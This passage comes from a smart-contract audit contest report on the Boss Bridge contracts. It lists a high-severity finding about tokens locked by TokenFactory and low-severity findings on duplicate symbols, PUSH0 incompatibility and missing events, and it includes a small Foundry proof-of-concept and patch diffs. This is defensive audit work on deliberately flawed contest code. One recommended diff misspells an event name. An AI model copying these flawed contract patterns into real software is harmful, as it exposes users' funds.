<br>

Of course, this means that the user needs to always withdraw the entire amount deposited by him. In case partial withdrawals are to be allowed too, then an additional mapping would be required which keeps track of the withdrawn amount so far and validates that the requested `amount` to withdraw is always less than or equal to `depositedAmount - withdrawnAmount`. Following is the diff patch to be applied in such a case:

```diff
diff --git a/src/L1BossBridge.sol b/src/L1BossBridge.sol
index 3925b86..62ad26c 100644
--- a/src/L1BossBridge.sol
+++ b/src/L1BossBridge.sol
@@ -32,6 +32,8 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
     IERC20 public immutable token;
     L1Vault public immutable vault;
     mapping(address account => bool isSigner) public signers;
+    mapping(address account => uint256 amount) public deposited;
+    mapping(address account => uint256 amount) public withdrawn;
 
     error L1BossBridge__DepositLimitReached();
     error L1BossBridge__Unauthorized();
@@ -71,6 +73,7 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
         if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
             revert L1BossBridge__DepositLimitReached();
         }
+        deposited[from] += amount;
         token.safeTransferFrom(from, address(vault), amount);
 
         // Our off-chain service picks up this event and mints the corresponding tokens on L2
@@ -89,6 +92,8 @@ contract L1BossBridge is Ownable, Pausable, ReentrancyGuard {
      * @param s The s value of the signature
      */
     function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+        require(amount + withdrawn[msg.sender] <= deposited[msg.sender], "Invalid withdrawal amount");
+        withdrawn[msg.sender] += amount;
         sendToL1(
             v,
             r,
```
## <a id='H-07'></a>H-07. `L1Token` contract deployment from `TokenFactory` locks tokens forever

_Submitted by [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/TokenFactory.sol#L23

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/main/src/L1Token.sol#L10

## Summary

`L1Token` contract deployment from `TokenFactory` locks tokens forever

## Vulnerability Details

`TokenFactory::deployToken` deploys `L1Token` contracts, but the `L1Token` mints initial supply to `msg.sender`, in this case, the `TokenFactory` contract itself. After deployment, there is no way to either transfer out these tokens or mint new ones, as the holder of the tokens, `TokenFactory`, has no functions for this, also not an upgradeable contract, so all token supply is locked forever.

## Impact

High. Using this token factory to deploy tokens will result in unusable tokens, and no transfers can be made.

## Tools Used

- Manual Review

## Recommendations

Consider passing a receiver address for the initial minted tokens, different from the msg.sender:

```diff
contract L1Token is ERC20 {
    uint256 private constant INITIAL_SUPPLY = 1_000_000;

-    constructor() ERC20("BossBridgeToken", "BBT") {
+    constructor(address receiver) ERC20("BossBridgeToken", "BBT") {
-         _mint(msg.sender, INITIAL_SUPPLY * 10 ** decimals());
+         _mint(receiver, INITIAL_SUPPLY * 10 ** decimals());
    }
}
```

# Medium Risk Findings



# Low Risk Findings

## <a id='L-01'></a>L-01. `TokenFactory::deployToken` can create multiple token with same `symbol`

_Submitted by [oops0x7070](/profile/clor5uy2k0001l60881r9ya6p), [araj](/profile/clma4kzm40000lb08cngnui6u), [nisedo](/profile/clk3saar60000l608gsamuvnw), [georgishishkov](/profile/clobh0ans0000my08ser5uzpu), [banditxbt](/profile/clob62zxy0000l3088imc9gu4), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [letsDoIt](/team/clkjtgvih0001jt088aqegxjj), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [zxarcs](/profile/clk6xhhll0004jy08igg6220s), [eLSeR17](/profile/cloa521640004k008nepn5h9o), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [Louis](/profile/clloixi3x0000la08i46r5hc8), [dianivanov](/profile/clo3cuadr0017mp08rvq00v4e), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [XORs33r](/profile/clozhdki8002tjr08e1v1a5ud). Selected submission by: [araj](/profile/clma4kzm40000lb08cngnui6u)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/TokenFactory.sol#L23

## Summary
`TokenFactory::deployToken` is creating new token by taking token `symbol` and token `contractByteCode` as argument, owner can create multiple token with same `symbol` by mistake

## Vulnerability Details
`deployToken` is not checking weather that token exists or not.

How it will work
1. Owner created a token with symbol TEST and it will store tokenAddress in `s_tokenToAddress` mapping
2. Again owner created a token with symbol TEST and this will replace the previous tokenAddress with symbol TEST

Here is the PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { TokenFactory } from "../src/TokenFactory.sol";
import { L1Token } from "../src/L1Token.sol";

contract TokenFactoryTest is Test {
    TokenFactory tokenFactory;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        tokenFactory = new TokenFactory();
    }

    function test_can_create_duplicate_tokens() public {
        vm.startPrank(owner);
        address tokenAddress = tokenFactory.deployToken("TEST", type(L1Token).creationCode);
        address duplicate = tokenFactory.deployToken("TEST", type(L1Token).creationCode);
       
         // here you can see tokenAddress is the duplicate one
        assertEq(tokenFactory.getTokenAddressFromSymbol("TEST"), duplicate);
    }
}
```
To run test
```
forge test --mt test_can_create_duplicate_tokens -vvv
```


## Impact
If that token is being used in validation then all the token holders will lose funds

## Tools Used
Manual review

## Recommendations
Use checks to see, if that token exists in `TokenFactory::deployToken`
```diff
+    if (s_tokenToAddress[symbol] != address(0)) {
+          revert TokenFactory_AlreadyExist();
+     }
```
## <a id='L-02'></a>L-02. Unsupported Opcode in Multi-Chain Deployment

_Submitted by [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [nisedo](/profile/clk3saar60000l608gsamuvnw), [AzmaeenGH](/profile/clk6y22wr000yl7088q435slg), [zxarcs](/profile/clk6xhhll0004jy08igg6220s). Selected submission by: [nisedo](/profile/clk3saar60000l608gsamuvnw)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L15

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1Token.sol#L2

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1Vault.sol#L2

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/TokenFactory.sol#L2

## Vulnerability Details

The primary concern identified in the smart contracts relates to the Solidity compiler version used, specifically `pragma solidity 0.8.20;`. This version, along with every version after `0.8.19`, introduces the use of the `PUSH0` opcode. This opcode is not universally supported across all Ethereum Virtual Machine (EVM)-based Layer 2 (L2) solutions. For instance, ZKSync, one of the targeted platforms for this protocol's deployment, does not currently support the `PUSH0` opcode.

The consequence of this incompatibility is that contracts compiled with Solidity versions higher than `0.8.19` may not function correctly or fail to deploy on certain L2 solutions.

```solidity
File: L1BossBridge.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
```

## Impact

The impact of using a Solidity compiler version that includes the `PUSH0` opcode is significant for a protocol intended to operate across multiple EVM-based chains. Chains that do not support this opcode will not be able to execute the contracts as intended, resulting in a range of issues from minor malfunctions to complete deployment failures. This limitation directly affects the protocol's goal of wide compatibility and interoperability, potentially excluding it from deployment on key L2 solutions like ZKsync.

## Recommendations

To mitigate this issue and ensure broader compatibility with various EVM-based L2 solutions, it is recommended to downgrade the Solidity compiler version used in the smart contracts to `0.8.19`. This version does not utilize the `PUSH0` opcode and therefore maintains compatibility with a wider range of L2 solutions, including ZKsync. 

```diff
File: L1BossBridge.sol
// SPDX-License-Identifier: MIT
- pragma solidity 0.8.20;
+ pragma solidity 0.8.19;
```

This change will allow the protocol to maintain a consistent and deterministic bytecode across all targeted chains, ensuring functionality and deployment success on platforms that currently do not support the `PUSH0` opcode.
## <a id='L-03'></a>L-03. Missing events

_Submitted by [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [banditxbt](/profile/clob62zxy0000l3088imc9gu4), [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [bbcrypt](/profile/cllf3myg90006mb08a2qv3801), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [wafflemakr](/profile/clmm1t0210000mi08hak3ir5r), [theinstructor](/profile/clnvsrne1001ymh08z4oz4pq9), [imth3AK](/profile/cln8d5fvp0000l208ogfm95cq), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [DenTonylifer](/profile/clocyn92t0003mf088apzq7fo). Selected submission by: [Ciara](/profile/clnvs09md0006jx08tmvz0w19)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L91-L102

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L112-L125

https://github.com/Cyfrin/2023-11-Boss-Bridge/blob/dad104a9f481aace15a550cf3113e81ad6bdf061/src/L1BossBridge.sol#L57-L59

`L1BossBridge::withdrawToL1`, `L1BossBridge::sendToL1`, and `L1BossBridge::setSigner` do not emit events. Therefore, changes to the signers and withdrawals are not able to be viewed off-chain.

## Impact

When the state is initialized or modified, an event needs to be emitted.
Any state that is initialized or modified without an event being emitted is not visible off-chain. This means that any off-chain service is not able to view changes. For example, the key operators might look at the events to see how many signers had been set or withdrawals that have taken place.

This is a low-impact finding with a high likelihood since the contract is upgradeable, so is therefore being graded as a low-severity vulnerability.

## Recommended mitigation

Emit events for state-changing transactions:

```diff
+ event  TokensWithdrawn(address to, uint256 amount);

function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
    sendToL1(
        v,
        r,
        s,
        abi.encode(
            address(token),
            0, // value
            abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
        )
    );
+    emit TokensWithdrawn(to, amount);
}
```

```diff
+ event SentToL1(address target, uint256 value, bytes data);

function sendToL1(uint8 v, bytes32 r, bytes32 s, bytes memory message) public nonReentrant whenNotPaused {
    address signer = ECDSA.recover(MessageHashUtils.toEthSignedMessageHash(keccak256(message)), v, r, s);

    if (!signers[signer]) {
        revert L1BossBridge__Unauthorized();
    }

    (address target, uint256 value, bytes memory data) = abi.decode(message, (address, uint256, bytes));

    (bool success,) = target.call{ value: value }(data);
    if (!success) {
        revert L1BossBridge__CallFailed();
    }
+    emit SentToL1(target, value, data);
}
```

```diff
+ event SignerSet(address account, bool enabled);

function setSigner(address account, bool enabled) external onlyOwner {
        signers[account] = enabled;
+       emit SigerSet(account, enabled);
    }
```





